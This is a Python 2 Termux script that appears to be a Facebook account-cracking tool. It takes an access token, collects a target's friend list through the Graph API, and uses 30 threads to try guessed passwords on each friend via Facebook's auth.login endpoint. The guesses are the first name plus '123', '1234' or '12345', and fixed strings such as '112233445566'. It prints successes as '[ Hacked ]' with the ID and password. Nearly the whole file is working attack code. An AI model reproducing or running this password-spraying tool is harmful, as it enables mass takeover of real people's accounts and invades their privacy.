try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests ;pip2 install mechanize")
def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/pain.txt')
    reb = open('/data/data/com.termux/pain.txt', 'w')
    reb.write(idjscr)
    reb.close()
def hala():
    x = os.listdir('/data/data/com.termux/')
    if 'pain.txt' in x:
        os.system('chmod 777 /data/data/com.termux/pain.txt')
        readid = open('/data/data/com.termux/pain.txt', 'r').read()
        print('Your ID : ' + str(readid))
        textupload = requests.get('https://raw.githubusercontent.com/968hacker/ID-Active/main/ID-ACTIVE-hack-facebbok.txt').text
        if readid in textupload:pass
        else:
            os.system('clear ;figlet ID TOOl ;chmod 000 /data/data/com.termux/pain.txt ;xdg-open https://t.me/zed_cracker_1')
            print("\x1b[37;1m ID to Active Nakrawa.....")
            time.sleep(5)
            exit()
    else:
        idcr()
hala()
#############
os.system("clear")
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m"
RR = "\033[31;1m"
CC = "\033[36;1m"
B = "\033[34m"
Y = "\033[33;1m"
G = "\033[32m"
W = "\033[0;1m"
R = "\033[31m" 
os.system('clear')
logo5=G+'''\n   ____    ____    U  ___ u  _   _     U  ___ u  ____     \nU /"___|U |  _"\ u  \/"_ \/ | \ |"|     \/"_ \/ / __"| u  \n\| | u   \| |_) |/  | | | |<|  \| |>    | | | |<\___ \/   \n | |/__   |  _ <.-,_| |_| |U| |\  |u.-,_| |_| | u___) |   \n  \____|  |_| \_\\_)-\___/  |_| \_|  \_)-\___/  |____/>>  \n _// \\   //   \\_    \\    ||   \\,-.    \\     )(  (__) \n(__)(__) (__)  (__)  (__)   (_")  (_/    (__)   (__)      '''
def dark():
    os.system("clear")
    print logo5
    time.sleep(0)
    os.system("clear")
    print logo5
    print(wd+' + = = = = = = = = = = = = = = = +')
    dark__select()
def dark__select():
    b_menu()
def login():
    os.system("clear")
    print logo5
    login_select()
def login_select():
    os.system("clear")
    print logo5
    print(' \t    \033[1;32mlogin with token\033[0;97m ')
    print(wd+' + = = = = = = = = = = = = = = = +')
    token = raw_input("   Token : ")
    token_s = open(".fb_token.txt","w")
    token_s.write(token)
    token_s.close()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
        nm = name.rsplit(" ")[0]
        print("\t\033[1;97mToken logged in as : "+nm+"\033[0;97m")
        time.sleep(3)
        dark()
    except (KeyError , IOError):
        print('" \t\033[1;31mToken not valid\033[0;97m "')
        raw_input(" Enter To Return:- ")
        login()
def login_fb():
	os.system("clear")
	print logo5
	os.system('" \t    \033[1;32mlogin with password\033[0;97m "')
	os.system('" \t    \033[1;32muse any proxy to login\033[0;97m "')
	os.system(wd+' + = = = = = = = = = = = = = = = +')
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	os.system(wd+' + = = = = = = = = = = = = = = = +')
	logging()
	data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
        q = json.loads(data)
        if "access_token" in q:
            succ = open(".login.txt","w")
            succ.write(q["access_token"])
            succ.close()
            os.system('" \n\033[1;92m Login Successfull\033[0;97m "')
            time.sleep(1)
            menu()
        else:
            if "www.facebook.com" in q["error_msg"]:
                os.system('" \n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m "')
                time.sleep(1)
                login_fb()
            else:
                os.system('"\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m  "')
                time.sleep(1)
                login_fb()
def b_menu():
    global token
    os.system("clear")
    print logo5
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("\t    "+c+"ID has checkpoint"+c2)
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo5
        os.system('" \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "')
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    print logo5
    b_menu_select()
def b_menu_select():
	id=[]
	oks=[]
	cps=[]
	os.system("clear")
	print logo5
	print('\t    Public ID   ')
	print(wd+' + = = = = = = = = = = = = = = = +')
	idt = raw_input(" Target ID :  ")
	print(wd+' + = = = = = = = = = = = = = = = +')
	time.sleep(2)
	os.system("clear")
	print logo5
	time.sleep(2)
	try:
		r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		q = json.loads(r.text)
		os.system("clear")
		print logo5
		print('\t    Public ID  ')
		print(wd+' + = = = = = = = = = = = = = = = +')
		print(" User ID : "+q["name"])
	except (KeyError , IOError):
		print('" \n\t\033[1;31m Error \033[0;97m "')
		raw_input("\nEnter To Return:- ")
		b_menu()
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid=i['id']
		na=i['name']
		nm=na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
		print()
	os.system('clear')
	print(logo5)
	print()
	print(" All(ID)   : "+str(len(id)))
	print()
	print('   pilz wait ...')
	print()
	print(wd+' + = = = = = = = = = = = = = = = +')
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass1 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		    else:
		    	if "access_token" in d:
		            print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass1 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass2 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		            else:
		                if 'access_token' in d:
		                    print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass2 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass3 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                    else:
		                        if 'access_token' in d:
		                            print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass3 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                        else:
		                            pass4=name+"1122334455"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass4 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                            else:
		                                if 'access_token' in d:
		                                    print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass4 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                                else:
		                                    pass5="112233445566"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass5 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                                    else:
		                                        if 'access_token' in d:
		                                            print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass5 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                                        else:
		                                            pass6="1122334455"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass6 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		                                            else:
		                                                if 'access_token' in d:
		                                                    print '\n \x1b[1;92m\xe2\x95\x94 [ Hacked ] ID: ' +uid+ ' | PASS:  ' + pass6 +'    \n \xe2\x95\x9a Open With Switch Sim . '
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print(wd+'\n + = = = = = = = = = = = = = = = +')
	print('     Process has completed ')
	print(wd+' + = = = = = = = = = = = = = = = +\n')
	raw_input("   Enter To return:- ")
	b_menu()
def dark_pro():
    print()
dark()